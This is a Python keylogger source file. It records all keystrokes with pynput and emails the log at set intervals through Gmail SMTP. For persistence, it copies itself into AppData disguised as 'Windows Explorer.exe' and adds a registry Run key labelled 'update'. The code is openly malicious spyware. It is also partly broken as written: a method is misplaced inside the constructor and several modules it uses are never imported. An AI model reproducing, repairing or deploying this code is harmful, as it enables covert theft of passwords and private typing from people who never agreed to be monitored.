#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keylogger:
	def __init__(self,time_interval,email,password):
		self.become_persistance()
		self.log = "keylogger started"
		self.interval=time_interval
		self.email = email
		self.password = password

		def become_persistance(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell=True)

	def append_to_log(self, string):
		self.log = self.log + string
		
	def process_key_pressed(self, key):
		try:
			current_key = str(key.char)
			#self.append_to_log(str(key.char))
		except AttributeError:
			if key == key.space:
				current_key =  " "
			else:
				current_key =  " " +str(key) + " "
		self.append_to_log(current_key)

	def report(self):
		#print(self.log)
		self.send_mail(self.email,self.password,"\n\n"+self.log)
		self.log=""
		timer = threading.Timer(self.interval, self.report)
		timer.start()	

	def send_mail(self, email, password, message):
		server = smtplib.SMTP("smtp.gmail.com",587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email, message)
		server.quit()	
	

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_pressed)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

